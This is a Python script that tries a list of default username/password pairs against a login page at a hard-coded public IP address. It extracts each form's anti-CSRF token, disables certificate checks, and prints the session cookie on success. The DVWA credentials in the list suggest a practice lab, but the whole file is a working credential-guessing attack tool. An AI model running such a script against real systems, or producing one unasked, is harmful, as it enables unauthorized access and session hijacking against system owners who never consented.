
import requests
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Common default credentials
default_creds = [
    ("admin", "admin"),
    ("admin", "password"),
    ("user", "password"),
    ("user", "user"),
    ("admin", "admin123"),
    ("admin", "123456"),
    ("root", "root"),
    ("test", "test"),
    ("dvwa", "dvwa"),
    ("admin", "dvwa")
]

url = "http://31.97.117.123/login.php"
session = requests.Session()

# Get initial session and token
response = session.get(url, verify=False)
print("[*] Initial connection established")

attempt = 0
for username, password in default_creds:
    attempt += 1
    print(f"\n[{attempt}] Trying {username}:{password}")
    
    # Get fresh token for each attempt
    response = session.get(url, verify=False)
    
    # Extract user_token from the form
    import re
    token_match = re.search(r"name='user_token'\s+value='([^']+)'", response.text)
    if token_match:
        user_token = token_match.group(1)
    else:
        print("[-] Could not extract token")
        continue
    
    # Prepare login payload
    payload = {
        "username": username,
        "password": password,
        "user_token": user_token,
        "Login": "Login"
    }
    
    # Attempt login
    response = session.post(url, data=payload, verify=False, allow_redirects=True)
    
    # Check if login was successful
    if "Welcome" in response.text or "logout" in response.text.lower() or "index.php" in response.url:
        print(f"\n[+] SUCCESS! Credentials: {username}:{password}")
        print(f"[+] Response URL: {response.url}")
        print(f"[+] Session cookie: {session.cookies}")
        break
    elif "login" in response.url and attempt < 10:
        print(f"[-] Failed - still on login page")
    else:
        print(f"[-] Failed")
    
    if attempt >= 10:
        print("\n[-] Reached 10 attempts, stopping")
        break

print(f"\n[*] Final URL: {response.url}")
print(f"[*] Response length: {len(response.text)}")

